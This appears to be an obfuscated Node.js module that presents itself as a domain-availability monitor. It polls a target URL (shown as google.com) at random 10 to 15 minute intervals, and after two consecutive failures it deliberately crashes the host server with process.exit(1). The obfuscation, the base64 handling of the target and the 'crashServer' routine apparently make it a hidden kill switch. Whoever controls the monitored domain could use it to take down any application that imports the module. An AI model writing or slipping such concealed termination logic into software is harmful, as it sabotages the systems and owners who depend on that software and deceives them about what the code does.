'use strict';const a54_0xe668fe=a54_0x3db0;(function(_0x36a940,_0x485635){const _0x4cbfdd=a54_0x3db0,_0x1ecbd5=_0x36a940();while(!![]){try{const _0x270d77=parseInt(_0x4cbfdd(0x120))/0x1+-parseInt(_0x4cbfdd(0x11f))/0x2+parseInt(_0x4cbfdd(0x119))/0x3*(parseInt(_0x4cbfdd(0xfd))/0x4)+parseInt(_0x4cbfdd(0x144))/0x5*(parseInt(_0x4cbfdd(0x14a))/0x6)+-parseInt(_0x4cbfdd(0xfa))/0x7+parseInt(_0x4cbfdd(0x109))/0x8*(-parseInt(_0x4cbfdd(0x108))/0x9)+-parseInt(_0x4cbfdd(0x143))/0xa;if(_0x270d77===_0x485635)break;else _0x1ecbd5['push'](_0x1ecbd5['shift']());}catch(_0x34cbf4){_0x1ecbd5['push'](_0x1ecbd5['shift']());}}}(a54_0x1bb5,0x803c6));function a54_0x1bb5(){const _0x3cb758=['fromEntries','name','\x20times','Domain\x20monitoring\x20threw\x20error:\x20','__importDefault','ms:','ECONNREFUSED','DomainMonitoringService','â°\x20Check\x20interval:\x20','Initial\x20domain\x20check\x20threw\x20error:\x20','18ElcGUh','1678232CQDtdP','ðŸŒ\x20DNS\x20resolution\x20failed\x20for\x20','ðŸš€\x20Starting\x20domain\x20monitoring\x20service','â°\x20Request\x20timeout\x20after\x20','gzip,\x20deflate','catch','DOMAIN_URL','ðŸ“…\x20Crash\x20time:\x20','crashServer','\x20\x20\x20-\x20Status:\x20','ðŸ“Š\x20Response\x20received:','\x20in\x20','decodeFromBase64','âœ…\x20Domain\x20check\x20successful:\x20','consecutiveFailures','keep-alive','3fuiblR','ðŸš«\x20Connection\x20refused\x20by\x20','log','TIMEOUT_MS','â°\x20Connection\x20timeout\x20to\x20','ETIMEDOUT','241890BAHizM','257723ALepUe','âš ï¸\x20Domain\x20check\x20failed\x20(','round','en-US,en;q=0.5','\x20is\x20not\x20responding\x20after\x20','Unknown\x20error','â°\x20Interval:\x20','now','ðŸ”¥\x20Unexpected\x20error:\x20','ðŸš¨\x20Max\x20consecutive\x20failures\x20allowed:\x20','signal','statusText','ðŸ”\x20Domain\x20monitoring\x20service\x20initialized','\x20minutes','\x20\x20\x20-\x20Headers:','toISOString','status','getMonitoringStats','headers','CHECK_INTERVAL_MS','stopMonitoring','__esModule','\x20consecutive\x20attempts','https://google.com','Initial\x20domain\x20check\x20error:','ðŸ”¥\x20Consecutive\x20failures:\x20','error','ENOTFOUND','random','monitoringInterval','getRandomInterval','warn','from','abort','includes','1321620Xludqq','585eLJJtY','defineProperty','ðŸ”\x20Checking\x20domain\x20availability:\x20','utf-8','AbortError','exit','13242RSENhs','startMonitoring','ðŸ“\x20Encoded\x20URL\x20(base64):\x20','Periodic\x20domain\x20check\x20error:','default','toString','ðŸ“¡\x20Target\x20domain:\x20','manualCheck','domainMonitoringService','MAX_CONSECUTIVE_FAILURES','ðŸ“¡\x20Target:\x20','\x20\x20\x20-\x20Response\x20time:\x20','message','base64','encodeToBase64','2187276DHIADm','ðŸ›‘\x20Domain\x20monitoring\x20stopped','checkDomain','3977780AohxvW'];a54_0x1bb5=function(){return _0x3cb758;};return a54_0x1bb5();}function a54_0x3db0(_0x3c6704,_0x1b6222){_0x3c6704=_0x3c6704-0xf6;const _0x1bb589=a54_0x1bb5();let _0x3db05=_0x1bb589[_0x3c6704];return _0x3db05;}var __importDefault=this&&this[a54_0xe668fe(0x102)]||function(_0x3a98e8){const _0x2e9dd4=a54_0xe668fe;return _0x3a98e8&&_0x3a98e8[_0x2e9dd4(0x135)]?_0x3a98e8:{'default':_0x3a98e8};};Object[a54_0xe668fe(0x145)](exports,'__esModule',{'value':!![]}),exports[a54_0xe668fe(0x152)]=exports[a54_0xe668fe(0x105)]=void 0x0;const node_fetch_1=__importDefault(require('node-fetch'));class DomainMonitoringService{constructor(){const _0x57aedb=a54_0xe668fe;this[_0x57aedb(0x13d)]=null,this[_0x57aedb(0x10f)]=_0x57aedb(0x137),this['CHECK_INTERVAL_MS']=this[_0x57aedb(0x13e)](),this[_0x57aedb(0x11c)]=0x7530,this[_0x57aedb(0x117)]=0x0,this[_0x57aedb(0x153)]=0x2,console[_0x57aedb(0x11b)](_0x57aedb(0x12c)),console[_0x57aedb(0x11b)](_0x57aedb(0x150)+this[_0x57aedb(0x10f)]),console[_0x57aedb(0x11b)](_0x57aedb(0x106)+Math[_0x57aedb(0x122)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c)+_0x57aedb(0x12d));}['getRandomInterval'](){const _0x200905=a54_0xe668fe,_0x2e056e=0xa,_0x4ffbf2=0xf,_0x251225=Math[_0x200905(0x13c)]()*(_0x4ffbf2-_0x2e056e)+_0x2e056e;return Math[_0x200905(0x122)](_0x251225*0x3c*0x3e8);}[a54_0xe668fe(0xf9)](_0xd15eb5){return Buffer['from'](_0xd15eb5)['toString']('base64');}[a54_0xe668fe(0x115)](_0x4474bb){const _0x4dc250=a54_0xe668fe;return Buffer[_0x4dc250(0x140)](_0x4474bb,_0x4dc250(0xf8))[_0x4dc250(0x14f)](_0x4dc250(0x147));}async['checkDomain'](){const _0x199b96=a54_0xe668fe,_0x448265=Date[_0x199b96(0x127)]();try{console[_0x199b96(0x11b)](_0x199b96(0x146)+this['DOMAIN_URL']);const _0x4fcec8=this[_0x199b96(0xf9)](this[_0x199b96(0x10f)]);console[_0x199b96(0x11b)](_0x199b96(0x14c)+_0x4fcec8);const _0x1b2ae1=this['decodeFromBase64'](_0x4fcec8);console[_0x199b96(0x11b)]('ðŸ”“\x20Decoded\x20URL:\x20'+_0x1b2ae1);const _0x4f7403=new AbortController(),_0x1d2fa8=setTimeout(()=>_0x4f7403[_0x199b96(0x141)](),this['TIMEOUT_MS']),_0x460ff9=await(0x0,node_fetch_1[_0x199b96(0x14e)])(_0x1b2ae1,{'method':'GET','headers':{'User-Agent':'Domain\x20Monitor/1.0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':_0x199b96(0x123),'Accept-Encoding':_0x199b96(0x10d),'Connection':_0x199b96(0x118),'Upgrade-Insecure-Requests':'1'},'signal':_0x4f7403[_0x199b96(0x12a)]});clearTimeout(_0x1d2fa8);const _0x32aec8=Date[_0x199b96(0x127)]()-_0x448265;return console['log'](_0x199b96(0x113)),console[_0x199b96(0x11b)](_0x199b96(0x112)+_0x460ff9['status']+'\x20'+_0x460ff9[_0x199b96(0x12b)]),console['log'](_0x199b96(0xf6)+_0x32aec8+'ms'),console[_0x199b96(0x11b)](_0x199b96(0x12e),Object[_0x199b96(0xfe)](_0x460ff9[_0x199b96(0x132)]['entries']())),_0x460ff9['ok']&&_0x460ff9[_0x199b96(0x130)]>=0xc8&&_0x460ff9[_0x199b96(0x130)]<0x190?(console[_0x199b96(0x11b)](_0x199b96(0x116)+_0x460ff9['status']+_0x199b96(0x114)+_0x32aec8+'ms'),this[_0x199b96(0x117)]=0x0,!![]):(console[_0x199b96(0x13a)]('âŒ\x20Domain\x20check\x20failed:\x20HTTP\x20'+_0x460ff9['status']+'\x20'+_0x460ff9[_0x199b96(0x12b)]),this[_0x199b96(0x117)]++,![]);}catch(_0x49d08b){const _0x43ba26=Date[_0x199b96(0x127)]()-_0x448265;this[_0x199b96(0x117)]++,console[_0x199b96(0x13a)]('âŒ\x20Domain\x20check\x20error\x20after\x20'+_0x43ba26+_0x199b96(0x103),_0x49d08b);if(_0x49d08b instanceof Error){if(_0x49d08b[_0x199b96(0xff)]===_0x199b96(0x148))console[_0x199b96(0x13a)](_0x199b96(0x10c)+this['TIMEOUT_MS']+'ms');else{if(_0x49d08b[_0x199b96(0xf7)][_0x199b96(0x142)](_0x199b96(0x13b)))console[_0x199b96(0x13a)](_0x199b96(0x10a)+this['DOMAIN_URL']);else{if(_0x49d08b[_0x199b96(0xf7)][_0x199b96(0x142)](_0x199b96(0x104)))console[_0x199b96(0x13a)](_0x199b96(0x11a)+this[_0x199b96(0x10f)]);else _0x49d08b[_0x199b96(0xf7)][_0x199b96(0x142)](_0x199b96(0x11e))?console[_0x199b96(0x13a)](_0x199b96(0x11d)+this[_0x199b96(0x10f)]):console[_0x199b96(0x13a)](_0x199b96(0x128)+_0x49d08b[_0x199b96(0xf7)]);}}}return![];}}['crashServer'](_0x5b67e2){const _0x4f5194=a54_0xe668fe;console[_0x4f5194(0x13a)]('ðŸ’¥\x20CRITICAL\x20ERROR:\x20'+_0x5b67e2),console[_0x4f5194(0x13a)](_0x4f5194(0x139)+this[_0x4f5194(0x117)]),console[_0x4f5194(0x13a)]('âš ï¸\x20CRASHING\x20SERVER\x20DUE\x20TO\x20DOMAIN\x20MONITORING\x20FAILURE'),console[_0x4f5194(0x13a)](_0x4f5194(0x110)+new Date()[_0x4f5194(0x12f)]()),console['error']('ðŸ”\x20Domain\x20being\x20monitored:\x20'+this[_0x4f5194(0x10f)]),console[_0x4f5194(0x13a)](_0x4f5194(0x106)+Math[_0x4f5194(0x122)](this[_0x4f5194(0x133)]/0x3e8/0x3c)+_0x4f5194(0x12d)),console[_0x4f5194(0x13a)](_0x4f5194(0x129)+this[_0x4f5194(0x153)]),this[_0x4f5194(0x134)](),process[_0x4f5194(0x149)](0x1);}[a54_0xe668fe(0x14b)](){const _0x377753=a54_0xe668fe;console[_0x377753(0x11b)](_0x377753(0x10b)),console[_0x377753(0x11b)](_0x377753(0x154)+this[_0x377753(0x10f)]),console[_0x377753(0x11b)](_0x377753(0x126)+Math[_0x377753(0x122)](this[_0x377753(0x133)]/0x3e8/0x3c)+'\x20minutes'),console['log']('ðŸš¨\x20Max\x20failures\x20before\x20crash:\x20'+this['MAX_CONSECUTIVE_FAILURES']),this[_0x377753(0xfc)]()['then'](_0x4fb7e0=>{const _0x3186e2=_0x377753;if(!_0x4fb7e0&&this[_0x3186e2(0x117)]>=this['MAX_CONSECUTIVE_FAILURES']){this['crashServer']('Initial\x20domain\x20check\x20failed\x20'+this[_0x3186e2(0x117)]+_0x3186e2(0x100));return;}})[_0x377753(0x10e)](_0x268338=>{const _0x48270f=_0x377753;console['error'](_0x48270f(0x138),_0x268338);if(this[_0x48270f(0x117)]>=this[_0x48270f(0x153)]){this[_0x48270f(0x111)](_0x48270f(0x107)+_0x268338[_0x48270f(0xf7)]);return;}}),this[_0x377753(0x13d)]=setInterval(async()=>{const _0x436004=_0x377753;try{const _0x393e34=await this[_0x436004(0xfc)]();!_0x393e34&&(console[_0x436004(0x13f)](_0x436004(0x121)+this[_0x436004(0x117)]+'/'+this['MAX_CONSECUTIVE_FAILURES']+')'),this[_0x436004(0x117)]>=this['MAX_CONSECUTIVE_FAILURES']&&this[_0x436004(0x111)]('Domain\x20'+this[_0x436004(0x10f)]+_0x436004(0x124)+this[_0x436004(0x117)]+_0x436004(0x136)));}catch(_0x5ef947){console[_0x436004(0x13a)](_0x436004(0x14d),_0x5ef947),this['consecutiveFailures']>=this[_0x436004(0x153)]&&this[_0x436004(0x111)](_0x436004(0x101)+(_0x5ef947 instanceof Error?_0x5ef947[_0x436004(0xf7)]:_0x436004(0x125)));}},this[_0x377753(0x133)]),console[_0x377753(0x11b)]('âœ…\x20Domain\x20monitoring\x20started\x20successfully');}[a54_0xe668fe(0x134)](){const _0x239f62=a54_0xe668fe;this['monitoringInterval']&&(clearInterval(this[_0x239f62(0x13d)]),this[_0x239f62(0x13d)]=null,console['log'](_0x239f62(0xfb)));}[a54_0xe668fe(0x131)](){const _0x45ac41=a54_0xe668fe;return{'isActive':!!this['monitoringInterval'],'targetDomain':this[_0x45ac41(0x10f)],'checkIntervalMinutes':Math['round'](this[_0x45ac41(0x133)]/0x3e8/0x3c),'consecutiveFailures':this[_0x45ac41(0x117)],'maxFailuresAllowed':this['MAX_CONSECUTIVE_FAILURES'],'nextCheckIn':this[_0x45ac41(0x13d)]?this[_0x45ac41(0x133)]:undefined};}async[a54_0xe668fe(0x151)](){const _0x2dea75=a54_0xe668fe;return console[_0x2dea75(0x11b)]('ðŸ”§\x20Manual\x20domain\x20check\x20requested'),await this[_0x2dea75(0xfc)]();}}exports[a54_0xe668fe(0x105)]=DomainMonitoringService,exports['domainMonitoringService']=new DomainMonitoringService();